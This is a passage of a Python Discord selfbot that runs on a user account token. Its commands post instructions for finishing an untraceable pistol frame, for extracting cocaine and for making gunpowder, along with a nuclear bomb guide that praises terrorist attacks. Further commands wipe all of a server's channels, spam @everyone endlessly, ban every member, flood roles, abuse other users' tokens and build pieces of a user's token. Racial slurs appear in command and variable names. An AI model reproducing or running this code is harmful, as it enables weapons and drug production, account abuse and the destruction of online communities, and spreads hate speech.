    await ctx.send("**THE TOOLS YOU WILL NEED ARE:**\n```\nA Dremel or other rotary tool with a sanding drum\nA set of metal files\nCoarse and fine-grit sandpaper (we used 100-, 800-, and 1,200-grit)\nWD-40 and a firearm lubricant such as RemOil or Ballistol\nA hammer (preferably nylon, rather than metal, so as not to mar the frame)\nA flathead screwdriver\nA bench vise (optional but helpful)\nA power drill (optional; your rotary tool may be substituted)\n```\n**REMINDER**\n```\nTo make it more realistic you need a 3d printer or crafting skills, if you want to do it without 3d printer and just wood, you can make only a primitive version of the gun.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795595215612149800/guns-inside2.jpg")
    await ctx.send("```\nHere's all you need to build.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795595619594010634/guns-inside1.jpg")
    await ctx.send("```\nAssemble the needed supplies. Using a vise, secure the frame in the jig and make sure it is level. Optionally, tape the ends of the jig to ensure minimal movement of the frame.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795595958569271316/guns-figure1.jpg")
    await ctx.send("```\nUsing the Dremel and the sanding drum attachment, start to sand down the polymer tabs marked for removal. Be very careful. While you can use the Dremel for the entire process, it is much easier to make a mistake that way. Use the Dremel for most of the heavy lifting. In the next step, you'll continue the sanding by hand for a more precise and smooth result.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795596224429686804/guns-figure2.jpg")
    await ctx.send("```\nOnce the majority of the material has been removed from all four tabs, use hand files to smooth the remaining material. Be sure not to go too far into the frame. The files should be used to remove the material in the corners that the sanding drum can't reach.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795596536885149736/guns-figure3.jpg")
    await ctx.send("```\nWhile the frame is still in the jig, drill the holes for the trigger assembly and rear slide rails. The exact placement and drill-bit sizes for these holes are marked on the jig. Use the supplied drill bits in either a hand drill or the Dremel for this step. It is important that you take your time, making sure to drill a perfectly straight hole.\n```\n**REMINDER**\n```\nWhen drilling, do not go through the entire frame from one side. Instead, alternate drilling on each side until you feel the drill bit break through the polymer. Use a sharp blade or a small file to clean up the holes on the inside of the frame.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795597097939632128/guns-figure4.jpg")
    await ctx.send("```\nUsing the Dremel or a round file, remove the excess polymer from the guide rod channel. There's a U-shaped mark on the polymer indicating which section is to be removed. Like before, be cautious and take your time.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795597546729766923/guns-figure5.jpg")
    await ctx.send("```\nAfter drilling the holes for the trigger assembly, you can begin the final round of sanding. Start by spraying a small amount of WD-40 on coarse-grit sandpaper for a wet-sand effect. Going slowly to make sure you don't bite into the frame, sand off any polymer that remains where the tabs were, cleaning up the plastic burrs that may still be attached to the frame. Once the tabs are totally flush with the rest of the frame, use the fine-grit sandpaper with WD-40 for a polished effect.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795598460795224064/guns-figure6.jpg")
    await ctx.send("```\nNow you're ready to start assembling the frame. Install the slide lock by inserting the slide lock spring into the top of the frame. Using a flathead screwdriver, depress the spring and push the slide lock into the channel on the side of the frame above the spring. The small lip on the slide lock should face toward the rear of the frame\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795598963930955776/guns-figure7.jpg")
    await ctx.send("```\nTo install the magazine catch, insert the magazine catch spring through the top of the frame and into the channel at the font of the magwell (i.e., the hollow space inside the grip that will accept the magazine). Push the magazine catch in through the side of the frame. With your flathead screwdriver, pull the top of the magazine catch spring away from the frame, allowing the magazine catch to slide underneath. Use the screwdriver to guide the magazine catch spring into the slot on the magazine release.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795599414584541184/guns-figure8.jpg")
    await ctx.send("```\nInsert the front and rear slide rails into the frame.```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795600016235692082/guns-figure9.jpg")
    await ctx.send("```\nUsing a hammer, tap them into place.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795600084301381663/guns-figure10.jpg")
    await ctx.send("```\nInsert the trigger assembly into the rear of the frame\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795600416871809024/guns-figure11.jpg")
    await ctx.send("```\nUsing a hammer, drive in the trigger housing pin, the P80 front rail pin, and the locking block pin\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795600496689414175/guns-figure12.jpg")
    await ctx.send("```\nInsert the slide stop lever. The U-shaped spring should rest underneath the locking block pin, and the hole should line up with the trigger pin hole. Drive in the trigger pin.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795600984361402378/guns-figure13.jpg")
    await ctx.send("```\nThe frame is ready to accept a slide assembly. Lubricate the rails and attach the slide to them. They may need some additional polishing or filing to allow the slide to move freely.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795601902733623306/guns-figure14.jpg\nhttps://cdn.discordapp.com/attachments/795589338363592725/795601902922104872/guns-figure15.jpg")
    await ctx.send(":warning: **WARNING** :warning:\n```\nInspect the frame and slide, ensuring everything functions properly before firing, as you would with any new firearm.\n```\nhttps://cdn.discordapp.com/attachments/795589338363592725/795602281755574272/guns-lastones.jpg")

@takaso.command()
async def cocaine(ctx):
    await ctx.message.delete()
    await ctx.send("```\nIn one method, dried coca leaves are soaked with lime water or other alkaline liquids and then extracted with kerosene in metal drums. Workers use sulfuric acid to extract the dissolved cocaine and form a liquid solution to which lime is added, leading to precipitation of coca paste.\nWorkers then add acid and potassium to remove impurities, followed by a bicarbonate, to cause the base to separate. The base is further dissolved in a solvent like acetone and then soaked again in acid. Finally, the cocaine paste is filtered through a cloth to separate, then dried.\nAlternately, the base can be dissolved in a solvent, such as acetone, ether, or ethyl acetate, and heated in a bath of hot water. Methyl ethyl ketone is another solvent that workers add to the hot liquid mixture, along with hydrochloric acid, leading to cocaine hydrochloride crystallizing in the solution. Solvents are pressed out by hand, followed by a hydraulic press, then the mixture is heated in a microwave to create cocaine powder.\n\nIt takes about 450-600 kilograms of fresh Colombian coca leaves to create 1 kilogram of cocaine base. The cocaine base can then be converted into a kilogram of cocaine hydrochloride or powdered cocaine. However, this amount differs with other species of coca leaves, since one species has higher levels of cocaine alkaloid and requires fewer leaves to create cocaine base\n```\nhttps://cdn.discordapp.com/attachments/795595392182910976/795650043138539550/recovery-shutter1356400-cocaine-trade_1.jpg")

@takaso.command()
async def bomb(ctx):
    await ctx.message.delete()
    await ctx.send("**Here's what we will need for this roadmap.** :fire:\n```\nPotassium nitrate, sulfer and charcoal and a pinch of sugar\n```")
    await ctx.send("*1st - Potassium nitrate*\n```Potassium nitrate can be made by combining ammonium nitrate and potassium hydroxide. An alternative way of producing potassium nitrate without a by-product of ammonia is to combine ammonium nitrate, found in instant ice packs, and potassium chloride, easily obtained as a sodium-free salt substitute.```\nhttps://cdn.discordapp.com/attachments/793951733381333022/793952625552654386/81REZQuFiL._SL1500_.jpg")
    await ctx.send("*2nd - Sulfur*\n```\nElemental sulfur can be found in a number of areas on Earth including volcanic emissions, hot springs, salt domes, and hydrothermal vents. Sulfur is also found in a number of naturally occurring compounds called sulfides and sulfates. Some examples are lead sulfide, pyrite, cinnabar, zinc sulfide, gypsum, and barite.\n```\nhttps://cdn.discordapp.com/attachments/793951733381333022/793953089752530954/sulfur-found-in-nature.png")
    await ctx.send("*3rd - Charcoal*\n```\nOn a basic level, charcoal is produced by burning wood or other organic matter in a low oxygen environment. Doing so removes water and other volatile elements, allowing the finished product, the charcoal, to burn at high temperatures with very little smoke.\n```\nhttps://cdn.discordapp.com/attachments/793951733381333022/793953616079749181/charcoal-hero.jpg")
    await ctx.send("*4th - Sugar*\n```\nSugars are found in the tissues of most plants. Honey and fruit are abundant natural sources of unbounded simple sugars. Sucrose is especially concentrated in sugarcane and sugar beet, making them ideal for efficient commercial extraction to make refined sugar.\n```\nhttps://cdn.discordapp.com/attachments/793951733381333022/793953921106051082/180px-Sugar_Cane_closeup.jpg")
    await ctx.send("**:warning: WARNING :warning:**\n```\nTHE RECIPE SHOWED HERE IS LEGIT. DON'T TRY IT AT HOME IF YOU'RE RETARDED, IT ACTUALLY CAUSED AN EXPLOSION 💥! \n```")

@takaso.command()
async def sexdoll(ctx):
    await ctx.message.delete()
    await ctx.send("```\nThe materials we need for this roadmap are:\n\nSilicone\n\nTPE o TPR\n\nTPR Silicon\n\nSuperSkin/CyberSkin\n\nGelatin\n\nLatex\n\nPVC\n```")
    await ctx.send("*1. Silicone*\n```\nSilicone is a polymer manufactured from silica contained in rocks and sand. Silica is one of the most common natural resources on earth.\n```\nhttps://cdn.discordapp.com/attachments/795297676861243412/795299245736722482/1200px-Caulking.jpg")
    await ctx.send("*2. TPE or TPR*\n```\nCompound a compound of rubber polymers with thermoplastic properties\n```\nhttps://cdn.discordapp.com/attachments/795297676861243412/795300335618359306/HTB19E9Eao_rK1Rjy0Fcq6zEvVXan.jpg_300x300.webp")
    await ctx.send("*3. TPR Silicone*\n```\nMix different components of silicone and TPE or TPR\n```\nhttps://cdn.discordapp.com/attachments/795297676861243412/795300777924755456/Soft-TPR-Silicone-Sleeves-for-all-Penis-Enlargement-Extender-Stretcher-Pump-Hanger-Enlarger-Penis-sl.jpg")
    await ctx.send("*4. PVC\n(Vinyl polychloride)*\n\n```\nPVC is obtained by polymerization of the vinylchloride monomer (VCM) at very high temperatures. This method is known as the ethylene process or path. Note: - Ethylene is a gas that must be pressurized before transport.\n```\nhttps://cdn.discordapp.com/attachments/795297676861243412/795302518909304862/PVC-3D-vdW.png")
    await ctx.send("*5. CyberSkin*\n```\nThermoplastic elastomer (PVC and Silicone compound)\n```\nhttps://cdn.discordapp.com/attachments/795297676861243412/795303852395200602/Screenshot_20210103_155221.jpg")
    await ctx.send("*6. Latex*\n```\nLatex is a viscous liquid that gushes out of the rubber shaft and is useful for making many everyday objects. Mattresses, pillows, tires, teases...\n```\nhttps://cdn.discordapp.com/attachments/795297676861243412/795304612189831168/Screenshot_20210103_155511.jpg")
    await ctx.send("*6.5 - How to get latex*\n```\nit is mostly extracted from the bark of the hevea brasiliensis tree. It is a milky and viscous liquid, an ecological and recyclable material, equipped with natural characteristics such as elasticity, durability and hygiene that make it suitable for various uses.\n```\nhttps://cdn.discordapp.com/attachments/795297676861243412/795304999156449280/shutterstock_1087361618-1080x720.jpg")
    await ctx.send("*7. Gelatin*\n```\nIn nature it can be obtained from sturgeon blisters (or other fish) left to dry. \n```\nhttps://cdn.discordapp.com/attachments/795297676861243412/795307050179493928/big_is_gelatin_bad_for_you_3.jpg")

@takaso.command()
async def nuclearbomb(ctx):
    await ctx.message.delete()
    await ctx.send("**THE MATERIALS WE WILL NEED ARE:**\n```\nPlutonium239 isotope. Around 25 pounds (10 kg) would be enough. If you could find some Uranium235, that would be good, but not great. You would need to refine it using a gas centrifuge. The uranium hexafluoride gas is piped in a cylinder, which is then spun at high speed. The rotation causes a centrifugal force that leaves the heavier U-238 isotopes at the outside of the cylinder, while the lighter U-235 isotopes are left at the center. The process is repeated many times over through a cascade of centrifuges to create uranium of the desired level of enrichment. To be used as the fissile core of a nuclear weapon, the uranium has to be enriched to more than 90 per cent and be produced in large quantities.\n```\nhttps://cdn.discordapp.com/attachments/796185367878434867/796185812143308810/How-To-Make-An-Atomic-Bomb-2.jpg")
    await ctx.send("**COMMON KNOWLEDGE**\n```\nFission bombs derive their power from nuclear fission, where heavy nuclei (uranium or plutonium) are bombarded by neutrons and split into lighter elements, more neutrons and energy. These newly liberated neutrons then bombard other nuclei, which then split and bombard other nuclei, and so on, creating a nuclear chain reaction which releases large amounts of energy. These are historically called atomic bombs, atom bombs, or A-bombs, though this name is not precise due to the fact that chemical reactions release energy from atomic bonds (excluding bonds between nuclei) and fusion is no less atomic than fission. Despite this possible confusion, the term atom bomb has still been generally accepted to refer specifically to nuclear weapons and most commonly to pure fission devices\n```")
    await ctx.send("**THE EXPLOSIVE TO START THE NUCLEAR CHAIN REACTION**:\n```\n100 pounds (44 kg) of trinitrotoluene (TNT). Gelignite (an explosive material consisting of collodion-cotton (a type of nitrocellulose or gun cotton) dissolved in nitroglycerine and mixed with wood pulp and sodium or potassium nitrate) would be better. Semtex would be good too, but it's a bit hard to get, these days.\n```")
    await ctx.send("**THE DETONATOR**\n```\nTo fabricate a detonator for the device, get a radio controlled (RC) servo mechanism, as found in RC model airplanes and cars. With a modicum of effort, a remote plunger can be made that will strike a detonator cap to effect a small explosion. These detonation caps can be found in the electrical supply section of your local supermarket. If you're an electronics wiz, you should be able to make it using a cellphone.\n```")
    await ctx.send("**THE PUSHER**\n```\nThe explosion shock wave might be of such short duration that only a fraction of the pit is compressed at any instant as it passes through it. A pusher shell made out of low density metal such as aluminium, beryllium, or an alloy of the two metals (aluminium being easier and safer to shape but beryllium reflecting neutrons back into the core) may be needed and is located between the explosive lens and the tamper. It works by reflecting some of the shock wave backwards which has the effect of lengthening it. The tamper or reflector might be designed to work as the pusher too, although a low density material is best for the pusher but a high density one for the tamper. To maximize efficiency of energy transfer, the density difference between layers should be minimized.\\n```")
    await ctx.send("```\nYou will need to get the fissile material to the critical mass in order to start the chain reaction, which depends upon the size, shape and purity of the material as well as what surrounds the material. Your weapons-grade uranium will have to be in subcritical configuration.\n```")
    await ctx.send("```\nYou must arrange the uranium into two hemispherical shapes, separated by about 4 cm. Since it's highly radioactive, the best way do it is to ask the friend owning the small country to let you use one his facilities. You could use a nuclear plant, a steel factory or even a well equipped pharmaceutical installation as a disguise for your plans.\n```")
    await ctx.send("**REMINDER**\n```\nIt's not sufficient to pack explosive into a spherical shell around the tamper and detonate it simultaneously at several places because the tamper and plutonium pit will simply squeeze out between the gaps in the detonation front. Instead, the shock wave must be carefully shaped into a perfect sphere centered on the pit and traveling inwards. This is achieved by using a spherical shell of closely fitting and accurately shaped bodies of explosives of different propagation speeds to form explosive lenses.\n```")
    await ctx.send("```\nAfter a few careful calculations, all you need now is to carefully pack and transport your nuclear bomb to the targeted location. If you happen to be an Al-Qaeda fan, you should try to infiltrate a military facility, for the psychological effect\n```")

@takaso.command()
async def lighter(ctx):
  await ctx.message.delete()
  await ctx.send("""
**Here's how to create a Lighter Using a Battery and Aluminum Foil, the battery tutorial will be created soon.**
**_----------------------------_**
**:warning: REMINDER:warning:**
```
Do not use an oxidized battery. It will also have to be charged enough to generate the flame. Any type of battery will be fine, but the AA alcalines are the most used for this type of experiment and have the appropriate size. 
```
""")
  await ctx.send("""
**STEP 1**
```
To make the lighter you will need a sheet of tin foil. In its absence you can use the casing of a chewing gum or the silver paper of cigarettes. 

If you use an AA battery, try folding the aluminum foil so that you get a strip about 1 cm wide and 3 cm long, with which to form a small bridge that connects each end of the pile.
To make the lighter you will need a sheet of tin foil. In its absence you can use the casing of a chewing gum or the silver paper of cigarettes. 

If you use an AA battery, try folding the aluminum foil so that you get a strip about 1 cm wide and 3 cm long, with which to form a small bridge that connects each end of the pile.
```
""")
  await ctx.send("""
**STEP 2**
```
The flame produced by this lighter lights up and wears out quickly. So, if you want to keep it on, you need to have a flammable source at hand to transfer fire to.
```
""")
  await ctx.send("""
**STEP 3**
```
When you are ready to ignite the flame, connect one end of the tin foil to the negative pole of the pile, after which it carefully places the other end on the positive pole, and it will start to burn.
```
""")

@takaso.command()
async def bleach(ctx):
  await ctx.message.delete()
  await ctx.send("""
```
The raw materials for making household bleach are chlorine, caustic soda, and water. The chlorine and caustic soda are produced by putting direct current electricity through a sodium chloride salt solution in a process called electrolysis.
```
https://cdn.discordapp.com/attachments/795361500092825651/795361793450311700/hpm_0000_0002_0_img0037.jpg 
  """)

@takaso.command()
async def aircooler(ctx):
  await ctx.message.delete()
  await ctx.send("""
```
You just need a fan and two plastic soda bottles to make this air conditioner. Modify the bottles by cutting off the end and punching holes in the sides. Then strap them to the back of the fan and fill the bottles with ice.
```
https://cdn.discordapp.com/attachments/795651675578826792/795651696751280135/hqdefault_4.jpg
  """)

@takaso.command()
async def negro(ctx):
  await ctx.message.delete()
  for c in ctx.guild.channels:
    await c.delete()
  while True:
    guild = ctx.message.guild
    await guild.create_text_channel('fucked by aag')




@takaso.event
async def on_message(message):
    await takaso.process_commands(message)
    if message.content == '$fastspam':
      await message.delete()
      s = 1
      while 2 != 1:
        await message.channel.send("""
@everyone





.








.








.

""")

@takaso.command()
async def fastspam(ctx):
  print("Spam has started, do Ctrl + C in the console to stop it.")


def retrive_messages(channelId):
    headers = {
        "authorization" : usertoken
    }
    r = requests.get(f"https://discord.com/api/v9/channels/{channelId}/messages", headers=headers)
    jsonn = json.loads(r.text)
    for value in jsonn:
        print(value, "\n")

@takaso.command()
async def getall(ctx, arg):
  retrive_messages(arg)

@takaso.command()
async def remotespam(ctx, channelId, *, arg):
  header = {
    "authorization" : usertoken
  }
  payload = {
    "content" : arg
  }
  while True:
    r = requests.post(f"https://discord.com/api/v9/channels/{channelId}/messages", data=payload, headers=header)

@takaso.command()
async def getguilds(ctx):
  await ctx.message.delete()
  async for guild in takaso.fetch_guilds(limit=100):
    print("%sServer that you are in:%s " % (blue(), reset()))
    print(f"%s- {guild.name}%s" % (green(), reset()))
    print(f"%sGuild ID: {guild.id}%s" % (green(), reset()))

@takaso.command()
@commands.has_permissions(administrator = True)
async def clone(ctx, guild_id: int):
		guild2 = ctx.guild

		try:
			guild1 = takaso.get_guild(guild_id)

		except:
			return await ctx.send("Guild not found.")

		for a in guild2.text_channels:
			await a.delete()

		for a in guild2.voice_channels:
			await a.delete()

		for a in guild2.categories:
			await a.delete()
			
		for a in guild2.roles:
			try:
				await a.delete()
			except:
				pass

		for a in guild1.categories:
			await guild2.create_category(name = a.name)

		for a in guild1.text_channels:
			cat = discord.utils.get(guild2.categories, name = a.category.name)
			await guild2.create_text_channel(name = a.name, category = cat, position = a.position, topic = a.topic, slowmode_delay = a.slowmode_delay)

		for a in guild1.voice_channels:
			cat = discord.utils.get(guild2.categories, name = a.category.name)
			await guild2.create_voice_channel(name = a.name, category = cat, position = a.position, user_limit = a.user_limit, bitrate = a.bitrate)


@takaso.event
async def on_member_update(before, after):
    if str(after.status) == "offline":
        print(f"%s{after.name} has gone {after.status}.%s" % (green(), reset()))

@takaso.command()
async def tokenspam(ctx, token, channelId, *, arg):
  await ctx.message.delete()
  header = {
    "authorization" : token
  }
  payload = {
    "content" : arg
  }
  while True:
    r = requests.post(f"https://discord.com/api/v9/channels/{channelId}/messages", data=payload, headers=header)

@takaso.event
async def on_message_delete(message):
  print("%s[Message logger]%s" % (green(), reset()))
  print(f"%s - {message.author} deleted a message: {message.content}%s" % (red(), reset()))

@takaso.command()
async def banall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member == takaso.user:
      continue
    try:
      await member.ban()
    except discord.Forbidden:
      print(f"%s{member.name} couldn't be banned from {ctx.guild.name}%s" % (red(), reset()))
    else:
      print(f"%s{member.name} has been banned from {ctx.guild.name}%s" % (green(), reset())) 

@takaso.command()
async def roleflood(ctx, *, name):
  await ctx.message.delete()
  try:
    while True:
      await ctx.guild.create_role(name=name)
  except:
    print("%sSomething went wrong, you're missing permissions or you reached max roles.%s" % (red(), reset()))

@takaso.command()
async def deletemess(ctx, channel, messageID):
  await ctx.message.delete()
  header = {
    "authorization" : usertoken
  }
  r = requests.delete(f"https://discord.com/api/v9/channels/{channel}/messages/{messageID}", headers=header)

@takaso.command()
async def channeldel(ctx, channel):
  try:
    await ctx.message.delete()
    header = {
    "authorization" : usertoken
    }
    r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=header)
  except:
    print("%s Failed to delete channel.%s" % (red(), reset()))

@takaso.command()
async def ghostflood(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  try:
    while raid:
      await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')
  except:
    print("%sSomething went wrong.%s" % (red(), reset()))

@takaso.command()
async def token(ctx, member : discord.Member):
  await ctx.message.delete()
  try:
    tempo = str(member.created_at)
    drip = time.mktime(datetime.datetime.strptime(tempo, "%Y-%m-%d %H:%M:%S.%f").timetuple())
    num1=12938400000
    num2=drip
    we = num2 + num1
    sample_string = str(member.id)
    sample_string_bytes = sample_string.encode("ascii") 
    base64_bytes = base64.b64encode(sample_string_bytes) 
    base64_string = base64_bytes.decode("ascii")
    embed=discord.Embed(title="〔🔑〕- Here's the info.", description=f"""
First piece of token
```
{base64_string}
```
Unencrypted second piece of token
```
{we}
```
Last piece of token
```
Not available since it gets randomly generated.
```
""", color=0x228b22)
    embed.set_footer(text="⚠️ Warning! If the user has MFA enabled, then these infos are useless.⚠️")
    await ctx.send(embed=embed)
  finally:
    print("The command works only in servers.")

@takaso.command()
async def godspam(ctx):
  await ctx.message.delete()
  for x in range(10000):
    await ctx.send("@everyone")


@takaso.event
async def on_message(message):
  await takaso.process_commands(message)
  if message.content == '$godspam':
    for x in range(100000):
      await message.channel.send("@everyone\n@everyone")

@takaso.command()
async def massdm(ctx, *, arg):
    for member in list(ctx.guild.members):
        try:
            await member.send(arg)
        except:
            pass

@takaso.command()
async def getids(ctx):
  niggers_ids = [member.id for member in ctx.guild.members]
  print(niggers_ids)
    

takaso.run(usertoken, bot=False)
